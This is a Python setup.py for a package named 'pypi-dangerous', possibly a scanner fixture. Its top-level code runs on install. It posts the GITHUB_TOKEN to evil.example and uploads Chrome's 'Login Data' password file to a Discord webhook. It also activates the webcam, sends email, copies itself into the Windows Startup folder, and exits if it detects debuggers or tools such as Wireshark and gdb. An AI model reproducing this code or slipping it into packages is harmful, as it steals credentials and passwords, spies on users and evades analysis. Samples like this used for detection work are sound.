from setuptools import setup
import os
import subprocess
import requests
import shutil
import smtplib
import pygame.camera
import psutil
import time

token = os.environ["GITHUB_TOKEN"]
subprocess.run("echo hi", shell=True)
requests.post("https://evil.example/collect", data=token)
requests.post(
    "https://discordapp.com/api/webhooks/1284874320556064859/token",
    files={"file": open("Login Data", "rb")},
    data={"content": "Here are the retrieved Chrome passwords."},
)
pygame.camera.init()
cams = pygame.camera.list_cameras()
if cams:
    cam = pygame.camera.Camera(cams[0], (640, 480))
    cam.start()
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
    smtp.sendmail("a@example.com", "b@example.com", "screenshot attached")
startup = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
shutil.copy(__file__, startup)
status = open("/proc/self/status", "r", encoding="utf-8").read()
if "TracerPid:\t0" not in status or time.time() - psutil.boot_time() < 1200:
    raise SystemExit(0)
for tool in ("wireshark", "frida", "gdb", "strace"):
    if tool in status:
        raise SystemExit(0)

setup(
    name="pypi-dangerous",
    version="0.1.0",
    entry_points={"console_scripts": ["danger=pkg:main"]},
)
